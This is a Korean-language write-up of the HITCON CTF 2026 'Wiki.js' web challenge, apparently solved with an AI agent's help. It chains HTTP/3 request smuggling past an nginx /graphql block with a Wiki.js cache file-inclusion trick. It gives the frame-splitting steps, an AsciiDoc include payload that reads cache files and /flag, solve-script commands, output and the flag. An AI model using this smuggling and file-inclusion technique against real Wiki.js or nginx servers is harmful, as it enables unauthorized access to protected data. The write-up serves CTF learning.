---
title: "[HITCON CTF 2026] Wiki.js"
date: 2026-10-25 00:35:00 +0900
categories: [CTF/Wargame]
tags: [ctf, web, http3, request-smuggling, lfi]
---

# Wiki.js - HTTP/3 요청 스머글링과 캐시 LFI를 연결한 공격

- 대회: HITCON CTF 2026
- 분야: web
- 상태: 원격 플래그 회수 완료, 제출은 사용자 수동 진행

## 문제 요약

Wiki.js 앞의 nginx는 `/graphql`을 차단하지만, 게스트에게는 `scratch/*` 페이지 쓰기 권한이 있다. 목표는 권한이 없어 직접 볼 수 없는 `/flag` 페이지를 읽는 것이다.

## 취약점 연결

1. 앞단의 `nginx/1.30.5`는 HTTP/3 unknown-frame 처리 결함(CVE-2026-95101)에 취약하다. unknown frame의 헤더와 payload를 서로 다른 parser invocation으로 보내면, 남은 skip 길이가 DATA 길이처럼 처리된다.
2. `proxy_request_buffering off`인 요청에 `Content-Length: 1`을 주고, 오인된 DATA를 `XPOST /graphql ...`로 구성하면 `X`가 첫 요청의 본문이 되고 나머지는 upstream의 두 번째 HTTP/1.1 요청이 된다. 이 방식으로 nginx의 `/graphql` 403을 우회한다.
3. 실제 Wiki.js에서는 전역 `bodyParser.urlencoded`가 첫 요청의 1바이트를 소비해야 Node가 뒤의 요청까지 파싱한다. 따라서 외부 요청의 Content-Type은 `application/x-www-form-urlencoded`이어야 한다. `application/octet-stream`은 바디가 paused 상태로 남아 주입 요청이 처리되지 않았다.
4. Wiki.js 페이지 컨트롤러는 권한 검사 전에 페이지를 불러와 디스크 캐시를 만든다. `/flag`를 요청하면 응답은 403이어도 보호 페이지 캐시가 생성된다.
5. 캐시 파일명은 `sha1(locale + '|' + path + '|' + privateNS)`다. `/flag`의 locale이 `en`이고 private namespace가 비어 있으므로 다음 파일이 생성된다.

   ```text
   sha1("en|flag|") = 216602d9c594ba229a203ac2c2834d983646f1b5
   /wiki/data/cache/216602d9c594ba229a203ac2c2834d983646f1b5.bin
   ```

6. Wiki.js의 AsciiDoc 렌더러는 기본 `safeMode: server`에서 절대 경로 `include::...[]`를 허용한다. 주입한 GraphQL mutation으로 `scratch/*`에 AsciiDoc 페이지를 만들고 위 캐시를 include하면 렌더된 보호 페이지 내용이 공개 memo에 나타난다.

## 익스플로잇 절차

먼저 `GET /flag`로 캐시를 만든다. 그 뒤 HTTP/3 요청을 다음 순서로 분할 전송한다.

1. `POST /healthz`, `Content-Length: 1`, URL-encoded Content-Type 헤더 전송
2. unknown frame `0x21`의 type/length 헤더만 전송
3. 잠시 뒤 frame payload `X` + raw `POST /graphql HTTP/1.1` 전송
4. payload를 먼저 flush한 뒤 별도로 QUIC FIN 전송

GraphQL mutation이 만드는 페이지 내용은 다음과 같다.

```asciidoc
= cache probe

include::/proc/self/cwd/data/cache/216602d9c594ba229a203ac2c2834d983646f1b5.bin[]

include::/wiki/data/cache/216602d9c594ba229a203ac2c2834d983646f1b5.bin[]

include::/flag[]
```

재현 스크립트와 고정 의존성은 각각 `CTF/HITCON-2026/web/Wiki.js/solve/wiki_h3_cache_lfi.py`, `CTF/HITCON-2026/web/Wiki.js/solve/requirements.txt`에 있다.

```bash
cd /mnt/c/Users/user/Desktop/CTF/HITCON-2026/web/Wiki.js
python3 -m venv .venv
.venv/bin/pip install -r solve/requirements.txt
.venv/bin/python solve/wiki_h3_cache_lfi.py http://wiki.chal.hitconctf.com:30025
```

## 원격 검증

성공한 실행의 핵심 출력은 다음과 같다.

```text
[*] protected page cache warm-up: HTTP 403
[*] target cache hash: 216602d9c594ba229a203ac2c2834d983646f1b5
[*] memo path: /scratch/codex-h3-edd25b1b1097
[*] outer H3 response: 404, 1960 bytes
[*] memo fetch: HTTP 200, 3978 bytes
FLAG: hitcon{yo_bro_why_are_u_here_https://www.youtube.com/watch?v=kOqvcythATs}
```

생성된 memo를 별도 HTTP GET으로 다시 읽어 동일한 플래그 문자열을 확인했다. 플랫폼 제출은 하지 않았다.

## 플래그

```text
hitcon{yo_bro_why_are_u_here_https://www.youtube.com/watch?v=kOqvcythATs}
```
